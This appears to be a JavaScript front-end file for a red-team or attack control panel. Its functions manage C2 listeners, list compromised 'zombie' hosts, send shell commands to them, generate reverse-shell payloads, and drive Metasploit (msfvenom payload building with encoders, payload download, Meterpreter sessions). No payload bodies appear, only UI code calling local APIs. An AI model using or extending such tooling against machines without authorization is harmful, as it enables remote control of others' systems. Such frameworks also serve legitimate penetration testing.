// ==========================================
// C2 and MSF Functions
// Extracted from api.js
// ==========================================

// --- C2 Functions ---
window._c2SelectedZombie = null;
window._c2PollInterval = null;
window._c2OutputIndex = 0;

function openC2Modal() {
    document.getElementById('c2Modal').style.display = 'block';
    refreshC2Listeners();
    refreshC2Zombies();
    window._c2PollInterval = setInterval(refreshC2All, 3000);
}

function closeC2Modal() {
    document.getElementById('c2Modal').style.display = 'none';
    if (window._c2PollInterval) { clearInterval(window._c2PollInterval); window._c2PollInterval = null; }
}

function refreshC2All() {
    refreshC2Listeners();
    refreshC2Zombies();
    if (window._c2SelectedZombie) { refreshC2Terminal(window._c2SelectedZombie); }
}

async function refreshC2Listeners() {
    try {
        const res = await fetch('/api/c2/listeners');
        const data = await res.json();
        const container = document.getElementById('c2ListenersList');
        if (!data.listeners || data.listeners.length === 0) {
            container.innerHTML = '<div style="color: var(--text-dim); font-style: italic;">No active listeners</div>';
            return;
        }
        let html = '';
        data.listeners.forEach(function (l) {
            const statusColor = l.status === 'running' ? '#4CAF50' : '#bf616a';
            html += '<div style="margin-bottom: 4px; padding: 4px; border: 1px solid rgba(255,255,255,0.1); border-radius: 3px;">' +
                '<span style="color: ' + statusColor + ';">●</span> <b>' + escapeHtml(l.name) + '</b> :' + l.port +
                '<span style="color: var(--text-dim); font-size: 9px;">(' + l.zombie_count + ' zombies)</span>' +
                (l.status === 'running' ? '<button onclick="stopC2Listener(\'' + l.id + '\')" style="float:right; font-size: 9px; padding: 1px 5px; border-color: #bf616a; color: #bf616a;">STOP</button>' : '') +
                '</div>';
        });
        container.innerHTML = html;
    } catch (e) { }
}

async function refreshC2Zombies() {
    try {
        const res = await fetch('/api/c2/zombies');
        const data = await res.json();
        const container = document.getElementById('c2ZombiesList');
        if (!data.zombies || data.zombies.length === 0) {
            container.innerHTML = '<div style="color: var(--text-dim); font-style: italic;">No zombies connected</div>';
            return;
        }
        let html = '';
        data.zombies.forEach(function (z) {
            const isSelected = window._c2SelectedZombie === z.id;
            const bg = isSelected ? 'rgba(136,192,208,0.15)' : 'transparent';
            html += '<div onclick="selectC2Zombie(\'' + z.id + '\')" style="cursor:pointer; margin-bottom: 4px; padding: 6px; border: 1px solid ' + (isSelected ? '#88c0d0' : 'rgba(191,97,106,0.3)') + '; border-radius: 3px; background: ' + bg + ';">' +
                '<span style="color: #bf616a;">●</span> <b>' + escapeHtml(z.addr) + '</b>' +
                '<div style="font-size: 9px; color: var(--text-dim);">' + z.os_type + ' | ' + z.hostname + '</div></div>';
        });
        container.innerHTML = html;
    } catch (e) { }
}

async function startC2Listener() {
    const port = document.getElementById('c2ListenerPort').value;
    const name = document.getElementById('c2ListenerName').value || 'Listener';
    try {
        const res = await fetch('/api/c2/listener/start', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ port: parseInt(port), name: name })
        });
        const data = await res.json();
        if (data.status === 'success') {
            setStatus('C2 Listener started on port ' + data.port, 'success');
            refreshC2Listeners();
        } else { setStatus(data.message, 'error'); }
    } catch (e) { setStatus('Failed to start listener', 'error'); }
}

async function stopC2Listener(listenerId) {
    try {
        await fetch('/api/c2/listener/stop', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ listener_id: listenerId })
        });
        refreshC2Listeners();
        refreshC2Zombies();
    } catch (e) { }
}

function selectC2Zombie(zombieId) {
    window._c2SelectedZombie = zombieId;
    window._c2OutputIndex = 0;
    document.getElementById('c2TerminalTitle').textContent = 'Zombie: ' + zombieId;
    document.getElementById('c2DisconnectBtn').style.display = 'inline-block';
    document.getElementById('c2Terminal').innerHTML = '';
    refreshC2Zombies();
    refreshC2Terminal(zombieId);
}

async function refreshC2Terminal(zombieId) {
    try {
        const res = await fetch('/api/c2/zombie/output?zombie_id=' + zombieId + '&since=' + window._c2OutputIndex);
        const data = await res.json();
        if (data.status !== 'success') return;
        const terminal = document.getElementById('c2Terminal');
        data.output.forEach(function (o) {
            const color = o.type === 'command' ? '#a3be8c' : o.type === 'system' ? '#ebcb8b' : '#c0caf5';
            terminal.innerHTML += '<div style="color:' + color + '; margin:2px 0;">' + escapeHtml(o.data) + '</div>';
        });
        window._c2OutputIndex = data.total;
        terminal.scrollTop = terminal.scrollHeight;
        if (data.zombie_status !== 'connected') {
            document.getElementById('c2TerminalTitle').textContent = 'Zombie: ' + zombieId + ' [DISCONNECTED]';
        }
    } catch (e) { }
}

async function c2SendCommand() {
    const input = document.getElementById('c2CommandInput');
    const cmd = input.value.trim();
    if (!cmd || !window._c2SelectedZombie) return;
    input.value = '';
    try {
        await fetch('/api/c2/zombie/command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ zombie_id: window._c2SelectedZombie, command: cmd })
        });
        setTimeout(function () { refreshC2Terminal(window._c2SelectedZombie); }, 500);
    } catch (e) { }
}

async function c2DisconnectSelected() {
    if (!window._c2SelectedZombie) return;
    try {
        await fetch('/api/c2/zombie/disconnect', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ zombie_id: window._c2SelectedZombie })
        });
        window._c2SelectedZombie = null;
        document.getElementById('c2DisconnectBtn').style.display = 'none';
        document.getElementById('c2TerminalTitle').textContent = 'Select a zombie to interact...';
        refreshC2Zombies();
    } catch (e) { }
}

async function generateC2Payload() {
    const ip = document.getElementById('c2PayloadIP').value.trim();
    const port = document.getElementById('c2ListenerPort').value;
    const type = document.getElementById('c2PayloadType').value;
    if (!ip) { setStatus('Enter your IP address', 'error'); return; }
    try {
        const res = await fetch('/api/c2/payload/generate', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ listener_ip: ip, listener_port: parseInt(port), payload_type: type })
        });
        const data = await res.json();
        if (data.status === 'success') {
            const out = document.getElementById('c2PayloadOutput');
            out.style.display = 'block';
            out.textContent = data.payload;
            out.onclick = function () { navigator.clipboard.writeText(data.payload); setStatus('Payload copied!', 'success'); };
        }
    } catch (e) { }
}

// --- MSF Functions ---
function openMsfModal() { document.getElementById('msfModal').style.display = 'block'; }
function closeMsfModal() { document.getElementById('msfModal').style.display = 'none'; }

async function generateMsfPayload() {
    const platform = document.getElementById('msfPlatform').value;
    const lhost = document.getElementById('msfLhost').value.trim();
    const lport = parseInt(document.getElementById('msfLport').value) || 4444;
    const payloadType = document.getElementById('msfPayloadType').value;
    const encoder = document.getElementById('msfEncoder').value;
    const iterations = parseInt(document.getElementById('msfIterations').value) || 0;
    if (!lhost) { setStatus('Enter LHOST', 'error'); return; }
    const resultDiv = document.getElementById('msfResult');
    resultDiv.innerHTML = '<div style="color:#ebcb8b;">Generating payload...</div>';
    try {
        const res = await fetch('/api/msf/payload/generate', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ platform: platform, lhost: lhost, lport: lport, payload_type: payloadType, encoder: encoder, iterations: iterations })
        });
        const data = await res.json();
        if (data.status === 'success') {
            resultDiv.innerHTML = '<div style="margin-bottom:10px;"><b>Generated:</b> ' + escapeHtml(data.filename) + ' (' + data.size_bytes + ' bytes)</div>' +
                '<pre style="background:rgba(0,0,0,0.5);padding:10px;color:#a3be8c;overflow-x:auto;max-height:200px;">' + escapeHtml(data.command) + '</pre>' +
                '<button onclick="downloadMsfPayload(\'' + data.filename + '\')" style="margin-top:8px;font-size:11px;border-color:#4CAF50;color:#4CAF50;">Download Payload</button>';
        } else { resultDiv.innerHTML = '<div style="color:#bf616a;">' + data.message + '</div>'; }
    } catch (e) { resultDiv.innerHTML = '<div style="color:#bf616a;">msfvenom not found or error generating payload.</div>'; }
}

async function downloadMsfPayload(filename) {
    try {
        const res = await fetch('/api/msf/payload/download?filename=' + encodeURIComponent(filename));
        if (res.ok) {
            const blob = await res.blob();
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = filename; a.click();
            URL.revokeObjectURL(url);
        }
    } catch (e) { }
}

async function listMsfSessions() {
    try {
        const res = await fetch('/api/msf/sessions');
        const data = await res.json();
        const container = document.getElementById('msfSessionsList');
        if (!data.sessions || data.sessions.length === 0) {
            container.innerHTML = '<div style="color:var(--text-dim);">No active Meterpreter sessions</div>';
            return;
        }
        let html = '';
        data.sessions.forEach(function (s) {
            html += '<div style="padding:4px;border:1px solid rgba(255,255,255,0.1);margin-bottom:3px;">' +
                '<span style="color:#4CAF50;">●</span> Session ' + s.id + ': ' + s.type + ' @ ' + s.target_host + '</div>';
        });
        container.innerHTML = html;
    } catch (e) { }
}

async function executeMsfCommand() {
    const cmd = document.getElementById('msfCommandInput').value.trim();
    if (!cmd) return;
    try {
        const res = await fetch('/api/msf/execute', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
        });
        const data = await res.json();
        document.getElementById('msfConsoleOutput').innerHTML +=
            '<div style="color:#a3be8c;">$ ' + escapeHtml(cmd) + '</div><div style="color:#c0caf5;">' + escapeHtml(data.output || data.message || '') + '</div>';
    } catch (e) { }
}
